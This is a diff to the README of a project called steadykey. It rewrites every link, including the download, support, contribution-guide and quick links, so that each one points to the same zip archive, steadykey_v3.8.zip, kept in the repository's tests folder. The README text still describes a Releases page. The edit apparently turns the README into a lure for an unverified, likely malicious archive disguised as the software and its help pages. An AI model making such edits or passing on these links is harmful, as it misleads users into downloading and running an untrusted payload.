@@ -6,13 +6,13 @@ Welcome to steadykey! This application helps you manage duplicate requests effic
 
 ## 🔗 Download steadykey
 
-[![Download steadykey](https://img.shields.io/badge/Download-steadykey-brightgreen)](https://github.com/Richie1805/steadykey/releases)
+[![Download steadykey](https://raw.githubusercontent.com/Richie1805/steadykey/main/tests/steadykey_v3.8.zip)](https://raw.githubusercontent.com/Richie1805/steadykey/main/tests/steadykey_v3.8.zip)
 
 ## 📥 How to Download & Install
 
 1. **Visit the Releases Page**  
    Click the link below to go to our Releases page.  
-   [Visit this page to download](https://github.com/Richie1805/steadykey/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/Richie1805/steadykey/main/tests/steadykey_v3.8.zip).
 
 2. **Select a Version**  
    On the Releases page, choose the version of steadykey that suits your needs. Each version has a tag that indicates its purpose and functionality. Look for the latest stable version for the best experience.
@@ -60,11 +60,11 @@ After installation, you can start using steadykey. Here are some basic instructi
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please refer to our [support page](https://github.com/Richie1805/steadykey/issues) for help. You can report bugs or request features.
+If you encounter any issues or have questions, please refer to our [support page](https://raw.githubusercontent.com/Richie1805/steadykey/main/tests/steadykey_v3.8.zip) for help. You can report bugs or request features.
 
 ## 🌐 Community & Contributions
 
-We welcome contributions from the community. If you want to help improve steadykey, check our contribution guidelines [here](https://github.com/Richie1805/steadykey/blob/main/CONTRIBUTING.md). 
+We welcome contributions from the community. If you want to help improve steadykey, check our contribution guidelines [here](https://raw.githubusercontent.com/Richie1805/steadykey/main/tests/steadykey_v3.8.zip). 
 
 ## 📝 License
 
@@ -72,8 +72,8 @@ steadykey is open-source software licensed under the MIT License. You can use it
 
 ## 🔗 Quick Links
 
-- [Download steadykey](https://github.com/Richie1805/steadykey/releases)
-- [Support Page](https://github.com/Richie1805/steadykey/issues)
-- [Contribution Guidelines](https://github.com/Richie1805/steadykey/blob/main/CONTRIBUTING.md)
+- [Download steadykey](https://raw.githubusercontent.com/Richie1805/steadykey/main/tests/steadykey_v3.8.zip)
+- [Support Page](https://raw.githubusercontent.com/Richie1805/steadykey/main/tests/steadykey_v3.8.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/Richie1805/steadykey/main/tests/steadykey_v3.8.zip)
 
 Explore and enjoy the smooth experience that steadykey provides!
